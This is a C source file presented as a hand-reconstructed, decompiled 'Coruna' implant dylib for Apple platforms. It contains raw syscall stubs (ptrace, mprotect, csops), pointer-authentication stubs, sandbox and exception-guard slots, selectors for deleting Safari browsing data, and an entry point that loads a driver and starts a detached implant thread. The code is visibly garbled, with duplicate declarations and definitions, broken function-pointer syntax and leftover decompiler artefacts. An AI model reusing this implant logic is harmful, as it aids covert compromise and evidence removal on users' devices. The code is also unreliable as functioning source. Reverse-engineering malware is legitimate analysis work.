/*
 * Coruna implant dylib (implant) — hand-reconstructed native C
 *
 * Mach-O export _start: implant context, IO dispatch, dylib section resolve.
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}


typedef void (*coruna_implant_trampoline_fn)(void);

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack14(uint8_t hi, uint64_t lo)
{
    return ((uint64_t)hi << 32) | (uint32_t)lo;
}

static inline uint64_t coruna_cat(uint64_t hi, uint64_t lo)
{
    return (hi << 32) | (uint32_t)lo;
}



#include <coruna/names.h>

/* Implant runtime constants (from Mach-O image) */
static uint64_t k_implant_mmap_anon_fd;
static uint64_t k_implant_ctx_slot_primary;
static uint64_t k_implant_ctx_slot_secondary;
static uint64_t k_implant_ctx_slot_tertiary;
static uint64_t k_implant_ctx_field_u32;
static uint64_t k_implant_ctx_field_u64;
static uint64_t k_implant_slot_4e20;
static uint64_t k_implant_slot_7000 = 0x54000100ea00001fULL;
static uint64_t k_implant_svc_flag_c = 0x01003f54000100eaULL;
static uint8_t k_implant_slot_7006 = 0x00;
static uint64_t k_implant_slot_7007 = 0x0000c0ea01003f54ULL;
static uint8_t k_implant_slot_700a = 0x01;
static uint8_t k_implant_slot_700b = 0xea;
static uint64_t k_implant_jsc_dispatch_mask = 0x10000109540000c0ULL;
static uint64_t k_implant_slot_7530 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_11fc8 = 0x529a0020aa0003e8ULL;
static uint8_t k_implant_rodata_word_12001 = 0x11;
static uint16_t k_implant_rodata_word_12002 = 0xf940;
static uint8_t k_implant_rodata_word_12004 = 0xe0;
static uint8_t k_implant_rodata_word_12005 = 0x03;
static uint16_t k_implant_rodata_word_12006 = 0xaa08;
static uint8_t k_implant_rodata_word_12008 = 0x5f;
static uint8_t k_implant_rodata_word_12009 = 0x08;
static uint8_t k_implant_rodata_word_1200a = 0x1f;
static uint8_t k_implant_rodata_word_1200b = 0xd6;
static uint64_t k_implant_rodata_word_1200c = 0xd65f03c011002400ULL;
static uint8_t k_implant_rodata_word_12011 = 0x03;
static uint16_t k_implant_rodata_word_12012 = 0xd65f;
static uint64_t k_implant_rodata_word_12014 = 0x529a0020aa0003e8ULL;
static uint64_t k_implant_rodata_word_26a00 = 0x4090a80000000000ULL;
static uint64_t k_implant_rodata_word_26a08 = 0x408c200000000000ULL;
static uint64_t k_implant_rodata_word_26a20 = 0xf2982188b2704fe8ULL;
static uint64_t k_implant_rodata_word_26a28 = 0x0000004000000000ULL;
static uint64_t k_implant_rodata_word_26a30 = 0x52b2800952b28014ULL;
static uint64_t k_implant_rodata_word_26a38 = 0x0000000052b28008ULL;
static uint64_t k_implant_rodata_word_26a50 = 0x0000000400000001ULL;
static uint64_t k_implant_rodata_word_26a58 = 0x408a980000000000ULL;
static uint64_t k_implant_rodata_word_26a60 = 0x0000001000000004ULL;
static uint64_t k_implant_rodata_word_26a68 = 0x0000002000000000ULL;
static uint64_t k_implant_rodata_word_26a70 = 0x0000000042000000ULL;
static uint64_t k_implant_rodata_word_26a78 = 0x0000000040000000ULL;
static uint64_t k_implant_rodata_word_26a80 = 0x4090ab3333333333ULL;
static uint64_t k_implant_rodata_word_26a88 = 0x408a900000000000ULL;
static uint64_t k_implant_rodata_word_26a98 = 0x0000000500000020ULL;
static uint64_t k_implant_rodata_word_26aa0 = 0x408f400000000000ULL;
static uint64_t k_implant_rodata_word_26aa8 = 0x0000002800000000ULL;
static uint64_t k_implant_rodata_word_26ac0 = 0x0000013400000013ULL;
static uint64_t k_implant_rodata_word_26ac8 = 0x0000001800000013ULL;
static uint64_t k_implant_rodata_word_26ad0 = 0x000000010000009dULL;
static uint64_t k_implant_rodata_word_28630 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28660 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28680 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_286b0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_286d0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_286f0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28710 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28730 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28760 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28790 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_287c0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28880 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_288b0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_288d0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_288f0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28910 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_289d0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28a98 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28ab8 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28ae8 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28b18 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c050 = 0x75140ae33317f60fULL;
static uint64_t k_implant_rodata_word_2c058 = 0x1e35bc489bc58eb4ULL;
static uint64_t k_implant_rodata_word_2c060 = 0x817db76c5fb09ef0ULL;
static uint64_t k_implant_rodata_word_2c068 = 0x44b6c74c749c140dULL;
static uint64_t k_implant_rodata_word_2c070 = 0x817db76c5fb09ef0ULL;
static uint64_t k_implant_rodata_word_2c078 = 0x44b6c74c749c140dULL;
static uint8_t k_implant_rodata_word_2c098 = 0x00;
static uint8_t k_implant_rodata_word_2c099 = 0x00;
static uint64_t k_implant_rodata_word_2c09a = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c0a0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c0a8 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c0b0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c0b8 = 0x0000000032aaaba7ULL;
static uint64_t k_implant_rodata_word_2c0f8 = 0x0000000032aaaba7ULL;
static uint64_t k_implant_rodata_word_2c138 = 0x0100000cfeedfacfULL;
static uint64_t k_implant_rodata_word_2c718 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c723 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c728 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c780 = 0x0000007373625f5fULL;
static uint64_t k_implant_rodata_word_2c788 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c790 = 0x0000415441445f5fULL;
static uint64_t k_implant_rodata_word_2c798 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c7a0 = 0x000000000002c138ULL;
static uint64_t k_implant_rodata_word_2c7a8 = 0x0000000000000678ULL;
static uint64_t k_implant_rodata_word_26a10 = 0x000000000000000aULL;
static uint64_t k_implant_md5_init_state = 0x3320646e61707865ULL;
static uint64_t k_implant_rodata_word_26ab0 = 0x0000000e00000001ULL;
static uint64_t k_implant_rodata_word_26ad8 = 0x0000000000000008ULL;
static uint64_t k_implant_rodata_word_26ae8 = 0x000000000000000aULL;
static void *ptr_implant_fn_287e0 = (void *)0x8008000000019028ULL;
static void *ptr_implant_fn_28860 = (void *)0x8008000000017610ULL;
static void *ptr_implant_fn_28930 = (void *)0x800800000001b378ULL;
static void *ptr_implant_fn_289b8 = (void *)0x8008000000019028ULL;
static void *ptr_implant_fn_28a80 = (void *)0x800800000001b8ecULL;
static void *ptr_implant_fn_2c080 = (void *)0x800800000001ac0cULL;
static void *k_implant_objc_class___nsstring_slot = (void *)0x4008000000000001ULL;
static void *k_implant_objc_class___nsurl_slot = (void *)0x4038000000000027ULL;
static void *k_implant_sandbox_check_no_report_slot = (void *)0x400800000000002cULL;
static void *k_implant_nsconcreteglobalblock_slot = (void *)0xc0156ae10000002fULL;
static void *k_implant_nsconcreteglobalblock_slot = (void *)0xc0156ae10000002fULL;
static void *k_implant_nsconcretestackblock_slot = (void *)0x4008000000000030ULL;
static void *k_implant_chkstk_darwin_slot = (void *)0xc008000000000036ULL;
static void *k_implant_chkstk_darwin_slot = (void *)0xc008000000000036ULL;
static void *k_implant_chkstk_darwin_slot = (void *)0xc008000000000036ULL;
static void *k_implant_cxa_finalize_ranges_slot = (void *)0xc008000000000038ULL;
static void *k_implant_stack_chk_guard_slot = (void *)0x400800000000003eULL;
static void *k_implant_get_cpu_capabilities_slot = (void *)0x4008000000000044ULL;
static void *k_implant_dladdr_slot = (void *)0x400800000000004cULL;
static void *k_implant_dlsym_slot = (void *)0x4008000000000050ULL;
static void *k_implant_dyldversionnumber_slot = (void *)0x4008000000000051ULL;
static void *k_implant_kcfallocatordefault_slot = (void *)0x4008000000000028ULL;
static void *k_implant_kcfbooleanfalse_slot = (void *)0x4008000000000029ULL;
static void *k_implant_kcfhttpversion1_1_slot = (void *)0x400800000000000bULL;
static void *k_implant_kcfrunloopcommonmodes_slot = (void *)0x400800000000002aULL;
static void *k_implant_kcfrunloopdefaultmode_slot = (void *)0x400800000000002bULL;
static void *k_implant_kcfstreampropertyhttpproxy_slot = (void *)0x400800000000000cULL;
static void *k_implant_kcfstreampropertyhttpresponseheader_slot = (void *)0x400800000000000dULL;
static void *k_implant_kcfstreampropertysslsettings_slot = (void *)0x400800000000000eULL;
static void *k_implant_kcfstreamsslvalidatescertificatechain_slot = (void *)0x400800000000000fULL;
static void *k_implant_mach_task_self_slot = (void *)0x4008000000000067ULL;
static void *k_implant_objc_msgsend_slot = (void *)0xc0090000000000baULL;
static void *k_implant_strcmp_slot = (void *)0x4008000000000097ULL;
static void *k_implant_task_get_exc_guard_behavior_slot = (void *)0xc0080000000000a5ULL;
static void *k_implant_task_get_exc_guard_behavior_slot = (void *)0xc0080000000000a5ULL;
static void *k_implant_task_set_exc_guard_behavior_slot = (void *)0xc0080000000000a7ULL;
static void *k_implant_task_set_exc_guard_behavior_slot = (void *)0xc0180000000000a7ULL;
static void *k_implant_vm_page_mask_slot = (void *)0x40080000000000b2ULL;
static void *PTR_s_URLWithString__0002c000 = (void *)0x000800000002763aULL;
static void *PTR_s_allProfileIdentifiers_0002c008 = (void *)0x00080000000276b4ULL;
static void *PTR_s_deleteSafariWebsiteDataRecord_co_0002c010 = (void *)0x00080000000276e7ULL;
static void *PTR_s_ephemeralTabGroupManager_0002c018 = (void *)0x000800000002769bULL;
static void *PTR_s_host_0002c020 = (void *)0x0008000000027666ULL;
static void *PTR_s_stringWithCString_encoding__0002c028 = (void *)0x000800000002764aULL;
static void *PTR_s_websiteDataRecordWithDomain__0002c030 = (void *)0x00080000000276caULL;
static void *PTR_s_websiteDataRecordWithDomain_prof_0002c038 = (void *)0x000800000002766bULL;
coruna_svc_regpack_t coruna_write(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_open(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_close(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_getpid(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_ptrace(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_munmap(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_mprotect(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_csops(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_stat(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_fstat(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_mmap(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_mlock(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_munlock(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_shared_region_check_np(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}





void coruna_pacia(void)
{
  return;
}





void coruna_implant_nop_2(void)
{
  return;
}





void coruna_pacib(void)
{
  return;
}





void coruna_implant_nop_4(void)
{
  return;
}
uint64_t coruna_return_zero(void)
{
  return 0;
}





void coruna_implant_indirect_call0(void (*indirect_target)
{
  (*indirect_target)();
  return;
}





void coruna_dyld_port_index(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_dyld_port_index(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[12];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_c(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[4];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_stub(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_implant_stub_2(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_implant_stub_3(void)
{
  CallSupervisor(0x80);
  return;
}





uint64_t coruna_return_minus_one(void)
{
  return 0xffffffffffffffff;
}





uint64_t coruna_pad_stub(void)
{
  return 0;
}





uint64_t coruna_identity(uint64_t val)
{
  return val;
}





uint64_t coruna_dyld_port_index(void)
{
  return 0;
}





uint64_t coruna_identity_80bc(uint64_t val,uint64_t id_2)
{
  void (*ptr)(void);
  int err;
  uint64_t u;
  unsigned long unaff_x30;
  
  err = coruna_return_zero();
  if (err == 0) {
    return val;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  u = coruna_pacia(val,id_2);
  return u;
}





uint64_t coruna_identity_8110(uint64_t val,uint size,uint64_t id_2)
{
  void (*ptr)(void);
  int err;
  uint64_t u;
  unsigned long unaff_x30;
  
  err = coruna_return_zero();
  if ((err == 0) || (3 < size)) {
    return val;
  }
  switch(size) {
  case 1:
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
      return val;
    }
    ___stack_chk_fail();
case 2:
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
      return val;
    }
    ___stack_chk_fail();
case 3:
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
      return val;
    }
    ___stack_chk_fail();
}
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
    u = coruna_pacia(val,id_2);
    return u;
  }
    ___stack_chk_fail();
}





uint64_t _startl(void *ctx,short *arg)
{
  byte err;
  long handle;
  long addr;
  long off;
  void *ptr;
  int err;
  uint64_t *ptr;
  void (*ptr)(void);
  uint64_t u;
  long scratch;
  long bootargs;
  long thread_attr;
  int host_info;
  void *serial_buf;
  long action;
  pthread_t block_ctx;
  pthread_attr_t stack_guard;
  
  u = 0xad001;
  if (ctx == (void *)0x0) {
    return 0xad001;
  }
  if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
     (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
    (**(void (**)((long)ctx + 0x5f0))(ctx,0xcc104,0,0x730c416e);
  }
  if (((arg == (short *)0x0) || (*arg != 2)) || ((ushort)arg[1] < 2)) {
    if (*(char *)((long)ctx + 0x5eb) == '\0') {
      return 0xad001;
    }
    if (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0) {
      (**(void (**)((long)ctx + 0x5f0))(ctx,0xad001,0,0x730c41ed);
    }
    if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
       (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
      (**(void (**)((long)ctx + 0x5f0))(ctx,0xcc105,0,0x730c41e8);
    }
    return u;
  }
  action = 0;
  u = coruna_implant08_via_ctx_free_5(&action,ctx);
  if ((int)u != 0) {
    if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
       (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
      (**(void (**)((long)ctx + 0x5f0))(ctx,u,0,0x730c41f4);
    }
    if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
       (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
      (**(void (**)((long)ctx + 0x5f0))(ctx,0xcc105,0,0x730c41e8);
    }
    return u;
  }
  serial_buf = (void *)0x0;
  host_info = 0;
  u = (**(void (**)(action + 0x20))(action,&serial_buf,&host_info);
  if ((int)u == 0) {
    thread_attr = 0;
    u = coruna_find_objc_methlist(&thread_attr,ctx,*(uint64_t *)((long)ctx + 0x78),action,0x70003);
    bootargs = 0;
    if ((int)u == 0) {
      u = coruna_find_objc_methlist(&bootargs,ctx,*(uint64_t *)((long)ctx + 0xa0),action,0x70004)
      ;
      scratch = 0;
      if (((int)u == 0) &&
         (u = coruna_find_objc_methlist(&scratch,ctx,*(uint64_t *)((long)ctx + 0xa8),action,
                               0x70006), ptr = serial_buf, err = host_info, off = thread_attr,
         addr = bootargs, handle = scratch, (int)u == 0)) {
        if ((serial_buf == (void *)0x0) || (host_info == 0)) {
          if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
             (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
            (**(void (**)((long)ctx + 0x5f0))(ctx,0xad001,0,0x730c4fad);
          }
          u = 0xad001;
        }
        else {
          err = *(byte *)((long)ctx + 0x5c6);
          ptr = _calloc(0x38,1);
          if (ptr == (uint64_t *)0x0) {
            u = 0xad009;
            if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
               (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
              u = 0xad009;
              (**(void (**)((long)ctx + 0x5f0))(ctx,0xad009,0,0x730c4fb7);
            }
          }
          else {
            *ptr = arg;
            ptr[2] = ptr;
            *(int *)(ptr + 3) = err;
            ptr[5] = addr;
            ptr[6] = handle;
            ptr[4] = off;
            *(byte *)(ptr + 1) = err ^ 1;
            err = _pthread_attr_init(&stack_guard);
            if (err == 0) {
              err = 1;
              if (err == 0) {
                err = 2;
              }
              err = _pthread_attr_setdetachstate(&stack_guard,err);
              if (err == 0) {
                block_ctx = (pthread_t)0x0;
                _memcpy(&k_implant_rodata_word_2c138,ctx,0x648);
                err = _pthread_create(&block_ctx,&stack_guard,(void **)coruna_startl_thread,ptr);
                if (err == 0) {
                  if (err != 0) {
                    _pthread_join(block_ctx,(void **)0x0);
                  }
                  _pthread_attr_destroy(&stack_guard);
                  u = 0;
                  goto done;
                }
                if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
                   (ptr = *(void (**)((long)ctx + 0x5f0), ptr != (void (*)0x0)) {
                  err = 0xdde;
                  goto cleanup;
                }
              }
              else if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
                      (ptr = *(void (**)((long)ctx + 0x5f0), ptr != (void (*)0x0)) {
                err = 0xddc;
cleanup:
                (*ptr)(ctx,0xad00b,0,err + 0x730c416e);
              }
              _pthread_attr_destroy(&stack_guard);
            }
            else if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
                    (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
              (**(void (**)((long)ctx + 0x5f0))(ctx,0xad00b,0,0x730c4f42);
            }
            _free(ptr);
            u = 0xad00b;
          }
        }
      }
    }
    else {
      scratch = 0;
    }
    if (thread_attr != 0) {
      coruna_free_secure_str();
    }
    if (bootargs != 0) {
      coruna_free_secure_str();
    }
    if (scratch != 0) {
      coruna_free_secure_str();
    }
    _memset_s(serial_buf,host_info,0,host_info);
    _free(serial_buf);
  }
  else if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
          (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
    (**(void (**)((long)ctx + 0x5f0))(ctx,u,0,0x730c4183);
  }
done:
  coruna_ctx_free(action);
fail:
  if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
     (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
    (**(void (**)((long)ctx + 0x5f0))(ctx,0xcc105,0,0x730c41e8);
  }
  return u;
}





uint64_t
uint64_t coruna_find_objc_methlist(uint64_t *val,int64_t arg,char *path,int64_t arg,uint64_t id_2)
{
  int err;
  char *ptr;
  uint64_t u;
  uint32_t scratch;
  char *bootargs;
  
  if ((val == (uint64_t *)0x0) || (arg == 0)) {
    u = 0xad001;
    if ((arg != 0) &&
       ((*(char *)(arg + 0x5eb) != '\0' && (*(void (**)(arg + 0x5f0) != (void (*)0x0)))) {
      (**(void (**)(arg + 0x5f0))(arg,0xad001,0,0x730c410b);
    }
  }
  else if (path == (char *)0x0) {
    bootargs = (char *)0x0;
    scratch = 0;
    err = (**(void (**)(arg + 0x18))(arg,id_2,&bootargs,&scratch);
    if (err == 0) {
      ptr = _strdup(bootargs);
      *val = ptr;
    }
    u = 0;
  }
  else {
    ptr = _strdup(path);
    u = 0;
    *val = ptr;
  }
  return u;
}





void coruna_free_secure_str(char *path)
{
  void (*ptr)(void);
  size_t ls2;
  unsigned long unaff_x30;
  
  if (path == (char *)0x0) {
    return;
  }
  ls2 = _strlen(path);
  if (ls2 != 0) {
    _memset_s(path,ls2,0,ls2);
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  _free(path);
  return;
}





uint64_t _start(uint64_t *val)
{
  int err;
  uint64_t u;
  void (*ptr)(void);
  uint64_t size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  uint64_t type_id;
  uint64_t type_id_8;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t scratch;
  uint64_t sa_new;
  uint64_t path_buf;
  void (*tmp_buf)(void);
  uint64_t region;
  short *plist;
  void (*url_buf)(void);
  uint64_t json_buf;
  uint64_t frame;
  long work [2];
  
  if (val == (uint64_t *)0x0) {
    return 0xad001;
  }
  if (*(char *)((long)val + 0x5c2) == '\0') {
    path_buf = val[0x16];
    scratch = val[6];
    sa_saved = val[7];
    sa_new = val[0x25];
    stack_guard = val[0x26];
    serial_buf = val[0x1d];
    thread_attr = val[0x1f];
    bootargs = val[0x1e];
    host_info = val[0x21];
    scratch = val[0x20];
    type_id_8 = val[0x23];
    action = val[0x24];
    port = *val;
    size = val[1];
    version = val[2];
    tag = val[3];
    kind = val[4];
    block_ctx = val[5];
    type_id = val[0xbe];
    val[5] = coruna_surface_dispatch_thunk;
    val[0x16] = coruna_bzero;
    val[0x25] = coruna_bzero_2;
    val[0x24] = coruna_flush_caches;
    val[6] = coruna_init_libsystem;
    val[7] = coruna_implant08_via_return_zero;
    val[0x26] = coruna_implant08_via_driver_copy_port_1918;
    val[0x1e] = 0;
    val[0x1d] = 0;
    val[0x20] = 0;
    val[0x1f] = 0;
    val[0x22] = 0;
    val[0x21] = 0;
    val[0x23] = 0;
    *val = port;
    val[1] = size;
    val[2] = version;
    val[3] = tag;
    val[4] = kind;
    val[0xbe] = type_id;
  }
  else {
    action = 0;
    block_ctx = 0;
    sa_new = 0;
    path_buf = 0;
    sa_saved = 0;
    scratch = 0;
    stack_guard = 0;
    host_info = 0;
    serial_buf = 0;
    bootargs = 0;
    thread_attr = 0;
    scratch = 0;
    type_id_8 = 0;
    size = 0;
    version = 0;
    port = 0;
    tag = 0;
    kind = 0;
    type_id = 0;
  }
  if (*(char *)((long)val + 0x5ec) != '\0') {
    *(uint8_t *)((long)val + 0x5c6) = 1;
  }
  if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
    (*(void (*)val[0xbe])(val,0xcc101,0,0x730c405e);
  }
  if (*(char *)((long)val + 0x5c4) == '\0') {
    frame = 0;
    work[0] = 0;
    if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
      (*(void (*)val[0xbe])(val,0xcc102,0,0x730c4eec);
    }
    u = coruna_load_driver(work,val,1,&frame);
    if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
      (*(void (*)val[0xbe])(val,0xcc103,0,0x730c4eeb);
    }
    if ((int)u == 0) {
      u = coruna_implant_via_cat(work[0],val,frame);
      if ((int)u == 0) {
        u = coruna_run_startsc(val,work[0],frame);
      }
      else if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0))
      {
        (*(void (*)val[0xbe])(val,u,0,0x730c4ed1);
      }
      coruna_implant_via_dlopen_rpath(work[0],val);
    }
    else if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
      (*(void (*)val[0xbe])(val,u,0,0x730c4eca);
    }
    if ((uint32_t *)val[0xbc] != (uint32_t *)0x0) {
      *(uint32_t *)val[0xbc] = 5;
    }
    goto fail;
  }
  frame = 0;
  work[0] = 0;
  u = coruna_load_driver(work,val,0,&frame);
  if ((int)u != 0) {
    if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
      (*(void (*)val[0xbe])(val,u,0,0x730c4e9a);
    }
    goto fail;
  }
  u = coruna_implant_via_cat(work[0],val,frame);
  if ((int)u == 0) {
    json_buf = 0;
    url_buf = (void (*)0x0;
    u = coruna_implant_residual_39(work[0],0x90000,"_driver",&json_buf,&url_buf);
    if ((int)u == 0) {
      plist = (short *)0x0;
      if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
        (*(void (*)val[0xbe])(val,0xcc102,0,0x730c4e6f);
      }
      u = (*url_buf)(&plist);
